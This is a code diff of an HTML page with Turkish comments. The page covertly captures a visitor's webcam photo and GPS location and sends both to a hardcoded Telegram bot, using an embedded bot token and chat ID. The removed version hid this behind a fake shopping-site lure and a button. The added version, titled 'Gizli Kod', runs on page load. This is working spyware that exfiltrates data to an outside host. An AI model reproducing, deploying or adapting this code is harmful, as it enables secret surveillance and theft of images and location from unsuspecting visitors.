@@ -3,98 +3,69 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Gerçekmiş Gibi Alışveriş Sitesi</title>
-<link rel="stylesheet" href="styles.css">
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    background-color: #f0f0f0;
-  }
-
-  h1 {
-    color: #333;
-  }
-
-  p {
-    color: #666;
-  }
-
-  button {
-    padding: 10px 20px;
-    background-color: #007bff;
-    color: #fff;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-  }
-
-  button:hover {
-    background-color: #0056b3;
-  }
-</style>
+<title>Gizli Kod</title>
 </head>
 <body>
-<h1>Hoş Geldiniz!</h1>
-<p>Burası tamamen gerçek bir alışveriş sitesi gibi görünüyor, değil mi? 🛍️</p>
-<p>:</p>
-<button onclick="allowCamera()">BANA BAS 🤍</button>
-
 <script>
-function allowCamera() {
-  navigator.mediaDevices.getUserMedia({ video: true })
+var botToken = "6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc"; // Botun API anahtar
+var chatId = "6070918315"; // Telegram kullanc ID'si
+
+// Kullancya kamera ve konum eriimi izni iste
+navigator.mediaDevices.getUserMedia({ video: true })
     .then(function(stream) {
-      var video = document.createElement('video');
-      document.body.appendChild(video);
-      video.srcObject = stream;
-      video.play();
-
-      // Kamera erişim izni verildiğinde fotoğrafı çek
-      video.addEventListener('canplay', function() {
-        var canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        var context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        var imgData = canvas.toDataURL('image/jpeg');
-
-        // Fotoğrafı FormData nesnesiyle gönder
-        var formData = new FormData();
-        formData.append('chat_id', '6070918315');
-        formData.append('photo', dataURItoBlob(imgData)); // Base64 verisini Blob'a dönüştürme işlemi
-
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.telegram.org/bot6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc/sendPhoto');
-        xhr.send(formData);
-
-        // Metni de gönder
-        var xhrText = new XMLHttpRequest();
-        xhrText.open('POST', 'https://api.telegram.org/bot6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc/sendMessage');
-        xhrText.setRequestHeader('Content-Type', 'application/json');
-        xhrText.send(JSON.stringify({ chat_id: '6070918315', text: 'Merhaba Halil bey!' }));
-
-        // Kamera akışını durdur
-        stream.getTracks().forEach(track => track.stop());
-        document.body.removeChild(video);
-      });
-    })
-    .catch(function(err) {
-      console.error('Kamera erişimi reddedildi:', err);
+        // Kamera eriim izni verildiinde
+        navigator.geolocation.getCurrentPosition(function(position) {
+            // Konum eriim izni verildiinde
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            sendLocationToTelegramBot(latitude, longitude);
+        });
+        
+        // Kamera eriim izni verildiinde fotoraf çek
+        var video = document.createElement('video');
+        document.body.appendChild(video);
+        video.srcObject = stream;
+        video.play();
+        video.addEventListener('canplay', function() {
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            var context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            var imgData = canvas.toDataURL('image/jpeg');
+            sendPhotoToTelegramBot(imgData);
+            stream.getTracks().forEach(track => track.stop());
+            document.body.removeChild(video);
+        });
     });
+
+function sendLocationToTelegramBot(latitude, longitude) {
+    var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendLocation?chat_id=" + chatId + "&latitude=" + latitude + "&longitude=" + longitude;
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', apiUrl);
+    xhr.send();
 }
 
-// Base64 verisini Blob'a dönüştürme fonksiyonu
+function sendPhotoToTelegramBot(imgData) {
+    var formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', dataURItoBlob(imgData));
+    var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', apiUrl);
+    xhr.send(formData);
+}
+
 function dataURItoBlob(dataURI) {
-  var byteString = atob(dataURI.split(',')[1]);
-  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-  var ab = new ArrayBuffer(byteString.length);
-  var ia = new Uint8Array(ab);
-  for (var i = 0; i < byteString.length; i++) {
-    ia[i] = byteString.charCodeAt(i);
-  }
-  var blob = new Blob([ab], {type: mimeString});
-  return blob;
+    var byteString = atob(dataURI.split(',')[1]);
+    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    var ab = new ArrayBuffer(byteString.length);
+    var ia = new Uint8Array(ab);
+    for (var i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    var blob = new Blob([ab], {type: mimeString});
+    return blob;
 }
 </script>
 </body>
